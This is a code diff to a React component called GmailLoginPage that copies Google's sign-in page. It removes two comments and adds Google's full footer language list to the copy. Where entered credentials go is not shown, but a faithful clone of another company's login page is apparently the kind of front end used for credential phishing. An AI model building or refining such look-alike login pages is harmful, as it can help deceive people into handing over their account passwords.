@@ -55,7 +55,6 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
   return (
     <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
       <main className="flex-grow w-full flex items-center justify-center p-4">
-        {/* Removed border and added a soft shadow to blend the card */}
         <div 
           className="w-full max-w-lg mx-auto py-10 px-6 md:px-12 bg-white rounded-2xl"
           style={{ boxShadow: '0 8px 32px rgba(0,0,0,.08)' }}
@@ -76,7 +75,6 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
                 // Email Step
                 <div>
                   <GoogleInput value={email} onChange={(e: any) => setEmail(e.target.value)} label="Email or phone" type="email" autoFocus />
-                  {/* Corrected the "Forgot email?" link */}
                   <a href="https://accounts.google.com/signin/v2/recovery/identifier" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
                     Forgot email?
                   </a>
@@ -112,8 +110,68 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
 
       <footer className="w-full max-w-lg mx-auto flex justify-between items-center p-4 text-xs text-gray-600">
         <div>
-          <select className="bg-transparent">
-            <option>English (United States)</option>
+          <select className="bg-transparent text-gray-800 py-2 pr-6">
+            <option value="af">Afrikaans</option>
+            <option value="az">Azərbaycan</option>
+            <option value="id">Bahasa Indonesia</option>
+            <option value="ms">Bahasa Melayu</option>
+            <option value="ca">Català</option>
+            <option value="cs">Čeština</option>
+            <option value="da">Dansk</option>
+            <option value="de">Deutsch</option>
+            <option value="et">Eesti</option>
+            <option value="en-GB">English (United Kingdom)</option>
+            <option value="en" selected>English (United States)</option>
+            <option value="es">Español (España)</option>
+            <option value="es-419">Español (Latinoamérica)</option>
+            <option value="eu">Euskara</option>
+            <option value="fil">Filipino</option>
+            <option value="fr">Français (France)</option>
+            <option value="fr-CA">Français (Canada)</option>
+            <option value="gl">Galego</option>
+            <option value="hr">Hrvatski</option>
+            <option value="zu">IsiZulu</option>
+            <option value="is">Íslenska</option>
+            <option value="it">Italiano</option>
+            <option value="sw">Kiswahili</option>
+            <option value="lv">Latviešu</option>
+            <option value="lt">Lietuvių</option>
+            <option value="hu">Magyar</option>
+            <option value="nl">Nederlands</option>
+            <option value="no">Norsk</option>
+            <option value="pl">Polski</option>
+            <option value="pt-BR">Português (Brasil)</option>
+            <option value="pt-PT">Português (Portugal)</option>
+            <option value="ro">Română</option>
+            <option value="sk">Slovenčina</option>
+            <option value="sl">Slovenščina</option>
+            <option value="fi">Suomi</option>
+            <option value="sv">Svenska</option>
+            <option value="vi">Tiếng Việt</option>
+            <option value="tr">Türkçe</option>
+            <option value="el">Ελληνικά</option>
+            <option value="bg">Български</option>
+            <option value="ru">Русский</option>
+            <option value="sr">Српски</option>
+            <option value="uk">Українська</option>
+            <option value="he">עברית</option>
+            <option value="ar">العربية</option>
+            <option value="fa">فارسی</option>
+            <option value="am">አማርኛ</option>
+            <option value="mr">मराठी</option>
+            <option value="hi">हिन्दी</option>
+            <option value="bn">বাংলা</option>
+            <option value="gu">ગુજરાતી</option>
+            <option value="ta">தமிழ்</option>
+            <option value="te">తెలుగు</option>
+            <option value="kn">ಕನ್ನಡ</option>
+            <option value="ml">മലയാളം</option>
+            <option value="th">ไทย</option>
+            <option value="ko">한국어</option>
+            <option value="zh-HK">中文 (香港)</option>
+            <option value="zh-CN">中文 (简体)</option>
+            <option value="zh-TW">中文 (繁體)</option>
+            <option value="ja">日本語</option>
           </select>
         </div>
         <div className="flex items-center space-x-4">
